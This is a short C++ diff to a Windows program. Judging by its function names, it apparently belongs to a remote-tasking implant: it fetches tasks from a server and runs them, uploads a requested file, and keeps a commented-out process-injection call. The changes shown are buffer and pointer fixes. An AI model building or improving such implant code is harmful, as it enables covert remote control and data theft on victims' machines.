@@ -141,9 +141,10 @@ bool fetchTasks(char** outBuffer, DWORD* dwSizeOut) {
         }
 
         memcpy(newBuf + *dwSizeOut, responseBuf, dwOut);
-
-        *outBuffer = newBuf;
+        
         *dwSizeOut += dwOut;
+        newBuf[*dwSizeOut - 1] = '\0';
+        *outBuffer = newBuf;
         delete[] responseBuf;
     }
 
@@ -332,7 +333,7 @@ int main(int argc, const char** argv) {
     std::string testFilename = ".\\file.txt";
     std::cout << "Uploading: " << testFilename << std::endl;
 
-    sendRequestedFile(testFilename);
+    //sendRequestedFile(testFilename);
     char* outBuffer = nullptr;
     DWORD dwSize = 0;
 
@@ -343,6 +344,7 @@ int main(int argc, const char** argv) {
                 runTask(outBuffer, dwSize);
                 // printf("TASK: %.*s\n", dwSize, outBuffer);
                 delete[] outBuffer;
+                outBuffer = nullptr;
                 dwSize = 0;
             }
             // processInject();
